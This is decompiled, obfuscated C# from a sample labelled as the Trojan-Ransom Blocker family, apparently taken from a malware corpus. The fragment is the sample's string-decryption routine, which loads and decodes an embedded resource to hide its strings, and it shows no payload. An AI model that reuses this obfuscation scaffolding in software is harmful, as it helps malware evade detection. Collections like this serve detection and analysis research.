// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C36FFE9C-B1BC-4A63-84C1-A0B2B2252CF0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.dztl-b921a7753edc30a9e3f5ced6b721782eb18bb83e.exe

using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0002
{
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0001.\u0002 \u0001;
    private static string \u0001;
    private static string \u0002;
    private static byte[] \u0001;
    private static Hashtable \u0001;
    private static bool \u0001;
    private static int \u0001;

    public static string \u0003([In] int obj0)
    {
      obj0 -= \u0002.\u0002.\u0001;
      if (\u0002.\u0002.\u0001)
      {
        string str = (string) \u0099.\u007E\u001F\u0003((object) \u0002.\u0002.\u0001, (object) obj0);
        if (str != null)
          return str;
      }
      int num1 = obj0;
      byte[] numArray1 = \u0002.\u0002.\u0001;
      int index1 = num1;
      int num2 = index1 + 1;
      int num3 = (int) numArray1[index1];
      int num4;
      if ((num3 & 128) == 0)
      {
        num4 = num3;
        if (num4 == 0)
          return string.Empty;
      }
      else if ((num3 & 64) == 0)
      {
        num4 = ((num3 & 63) << 8) + (int) \u0002.\u0002.\u0001[num2++];
      }
      else
      {
        int num5 = (num3 & 31) << 24;
        byte[] numArray2 = \u0002.\u0002.\u0001;
        int index2 = num2;
        int num6 = index2 + 1;
        int num7 = (int) numArray2[index2] << 16;
        int num8 = num5 + num7;
        byte[] numArray3 = \u0002.\u0002.\u0001;
        int index3 = num6;
        int num9 = index3 + 1;
        int num10 = (int) numArray3[index3] << 8;
        int num11 = num8 + num10;
        byte[] numArray4 = \u0002.\u0002.\u0001;
        int index4 = num9;
        num2 = index4 + 1;
        int num12 = (int) numArray4[index4];
        num4 = num11 + num12;
      }
      try
      {
        byte[] numArray5 = \u0091.\u0099\u0002(\u0017\u0003.\u007E\u0002\u0004((object) \u0016\u0002.\u0004\u0004(), \u0002.\u0002.\u0001, num2, num4));
        string str = \u0095\u0002.\u0087\u0002(\u0017\u0003.\u007E\u0002\u0004((object) \u0016\u0002.\u0004\u0004(), numArray5, 0, numArray5.Length));
        if (\u0002.\u0002.\u0001)
        {
          try
          {
            \u0094.\u007E\u001D\u0003((object) \u0002.\u0002.\u0001, (object) obj0, (object) str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u0002()
    {
      \u0001.\u0003.\u0003();
      \u0002.\u0002.\u0001 = "1";
      \u0002.\u0002.\u0002 = "242";
      \u0002.\u0002.\u0001 = (byte[]) null;
      \u0002.\u0002.\u0001 = (Hashtable) null;
      \u0002.\u0002.\u0001 = false;
      \u0002.\u0002.\u0001 = 0;
      if (\u0091\u0002.\u0014\u0002(\u0002.\u0002.\u0001, "1"))
      {
        \u0002.\u0002.\u0001 = true;
        \u0002.\u0002.\u0001 = new Hashtable();
      }
      \u0002.\u0002.\u0001 = \u0004\u0002.\u0097\u0002(\u0002.\u0002.\u0002);
      Assembly assembly = \u008F.\u008F\u0003();
      Stream stream = \u0097\u0002.\u007E\u0089\u0003((object) assembly, "{c36ffe9c-b1bc-4a63-84c1-a0b2b2252cf0}");
      try
      {
        int length = \u009F.\u0096\u0002(\u0083\u0002.\u007E\u0013\u0004((object) stream));
        byte[] numArray = new byte[length];
        int num = \u000F\u0003.\u007E\u0017\u0004((object) stream, numArray, 0, length);
        \u0002.\u0002.\u0001 = \u0003.\u0001.\u0003(numArray);
        \u0005\u0002.\u007E\u0015\u0004((object) stream);
      }
      finally
      {
        if (stream != null)
          \u0005\u0002.\u007E\u0013\u0002((object) stream);
      }
    }
  }
}
